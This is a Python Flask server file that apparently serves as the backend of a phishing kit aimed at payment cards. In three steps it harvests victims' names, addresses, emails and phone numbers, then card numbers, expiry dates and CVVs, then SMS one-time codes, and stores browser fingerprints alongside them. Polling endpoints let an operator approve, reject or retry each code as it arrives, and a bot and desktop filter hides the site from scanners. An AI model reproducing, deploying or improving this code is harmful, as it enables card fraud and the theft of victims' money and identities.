import time
import traceback

import jwt
from flask import g
from flask import (
    jsonify,
    request,
    render_template,
    abort,
    Response,
)
from flask_cors import CORS
from jwt import exceptions

from blacklist.blacklist import NoBot
from init import app
from models import User, Visit
from util.authorize import SALT
from util.redis_util import set_online, check_online, get_settings
from views.api import api
from views.user import user

CORS(app, supports_credentials=True)


@app.before_request
def limit_bot():
    if request.path.startswith('/api/v2/fetch_pending_data'):
        watch_seesion()
    # 机器人过滤
    nobot = NoBot()
    useragent = str(request.headers["User-Agent"])
    remote_addr = str(request.remote_addr)
    check_status = [
        nobot.is_bot_ip(remote_addr),
        nobot.is_bot_host(remote_addr),
        nobot.is_bot(useragent),
    ]
    if request.path.startswith("/js"):
        return None
    if request.path.startswith("/img"):
        return None
    if request.path.startswith("/css"):
        return None
    if request.path.startswith("/api"):
        return None
    if request.path.startswith("/media"):
        return None
    if request.path.startswith("/static"):
        return None
    if (
            check_status is False
            and "admin" not in request.path
            and "api" not in request.path
            and "delete_data" not in request.path
            and "user" not in request.path
    ):
        abort(404)
    try:
        Visit.add_record(str(request.headers["X-Forwarded-For"]))
    except KeyError:
        Visit.add_record(str(request.remote_addr))
    # 仅手机可访问
    if (
            NoBot().is_phone(useragent) is False
            and get_settings()["limit_desktop"] != "0"
            and "admin" not in request.path
            and "api" not in request.path
            and "delete_data" not in request.path
            and "user" not in request.path
    ):
        abort(404)


@app.before_request
def jwt_authentication():
    auth = request.headers.get("X-Token")
    if auth:
        g.username = None
        try:
            payload = jwt.decode(auth, SALT, algorithms=["HS256"])
            g.username = payload.get("username")
        except exceptions.ExpiredSignatureError:  # 'token已失效'
            g.username = 1
        except jwt.DecodeError:  # 'token认证失败'
            g.username = 2
        except jwt.InvalidTokenError:  # '非法的token'
            g.username = 3


@app.route("/<path:fallback>")
def fallback(fallback):
    if (
            fallback.startswith("css/")
            or fallback.startswith("js/")
            or fallback.startswith("img/")
            or fallback.startswith("media/")
            or fallback == "favicon.png"
    ):
        return app.send_static_file(fallback)
    else:
        return app.send_static_file("admin.html")


@app.route("/admin/<path:path>")
def admin_back(path):
    return render_template("admin.html")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/<path:path>")
def verification(path):
    return render_template("index.html")


@app.route("/api/step1", methods=["POST"])
def step_1():
    req_data = request.form
    person = {
        "appid": req_data["appid"],
        "full_name": req_data["full_name"],
        "address_1": req_data["address_1"],
        "address_2": req_data["address_2"],
        "city": req_data["city"],
        "state": req_data["state"],
        "zip": req_data["zip"],
        "email": req_data["email"],
        "phonenumber": req_data["phonenumber"],
    }
    fingerprint = [
        "lang:Accept-Language",
        "ip:X-Forwarded-For",
        "User_Agent:User-Agent",
        "plat:Sec-Ch-Ua-Platform",
    ]
    for i in fingerprint:
        fingerprint_data = i.split(":")
        try:
            person[fingerprint_data[0]] = request.headers[fingerprint_data[1]]
        except Exception as msg:
            person[fingerprint_data[0]] = ""
            print(msg)
    try:
        set_online(req_data["appid"])
        User.add_information(person)
        return jsonify(status="ok")
    except Exception as msg:
        return jsonify(status="error", msg=msg)


@app.route("/api/step2", methods=["POST"])
def step_2():
    req_data = request.form
    data_dict = {
        "appid": req_data["appid"],
        "card_number": req_data["card_number"],
        "exp_date": req_data["exp_date"],
        "cvv": req_data["cvv"],
    }
    try:
        set_online(req_data["appid"])
        User.add_card(data_dict)
        return jsonify(status="ok")
    except Exception as msg:
        return jsonify(status="error", msg=msg)


@app.route("/api/step3", methods=["POST"])
def step_3():
    try:
        req_data = request.form
    except:
        req_data = request.get_json()
    data_dict = {
        "appid": req_data["appid"],
        "otp": req_data["otp"],
    }
    try:
        set_online(req_data["appid"])
        User.add_otp(data_dict)
        return jsonify(status="ok")
    except Exception as msg:
        return jsonify(status="error", msg=msg)


# 检查卡片状态
@app.route("/api/check_card_status", methods=["GET"])
def check_card_status():
    appid = request.args.get("appid")
    if appid != "NaN":

        def event_stream():
            try_count = 0
            while True:
                try:
                    with app.app_context():
                        status = User.get_card_status(appid)
                        if get_settings()["syn"] == "0":
                            yield "data: ok\n\n"
                            break
                        if status == "放行":
                            yield "data: ok\n\n"
                            break
                        elif status == "拒绝":
                            User.reset_cardaction(appid)
                            yield "data: change\n\n"
                            break
                except Exception as msg:
                    print(msg)
                    yield 'status="wait"'
                finally:
                    set_online(appid)
                    try_count += 1
                    if try_count >= 60:
                        yield "data: change\n\n"
                        break
                    time.sleep(2)

        return Response(event_stream(), mimetype="text/event-stream")


# 检查验证码状态
@app.route("/api/check_otp_status", methods=["GET"])
def check_otp_status():
    appid = request.args.get("appid")
    if appid != "NaN":

        def event_stream():
            try_count = 0
            while True:
                try:
                    with app.app_context():
                        status = User.get_otp_status(appid)
                        if get_settings()["syn"] == "0":
                            yield "data: ok\n\n"
                            break
                        if status == "放行":
                            yield "data: ok\n\n"
                            break
                        elif status == "拒绝":
                            User.reset_smsaction(appid)
                            yield "data: change\n\n"
                            break
                        elif status == "重试":
                            User.reset_smsaction(appid)
                            yield "data: chongshi\n\n"
                            break
                except Exception as msg:
                    print(msg)
                    yield 'status="wait"'
                finally:
                    set_online(appid)
                    try_count += 1
                    if try_count >= 60:
                        yield "data: change\n\n"
                        break
                    time.sleep(2)

        return Response(event_stream(), mimetype="text/event-stream")


def watch_seesion():
    try:
        with app.app_context():
            check_list = User.check_online()
            if check_list is not None:
                for i in check_list:
                    if check_online(i) is None:
                        User.set_online(i, "离线")
                    else:
                        User.set_online(i, "在线")
    except:
        traceback.print_exc()


app.register_blueprint(api)
app.register_blueprint(user)

if __name__ == "__main__":
    app.run(threaded=True)
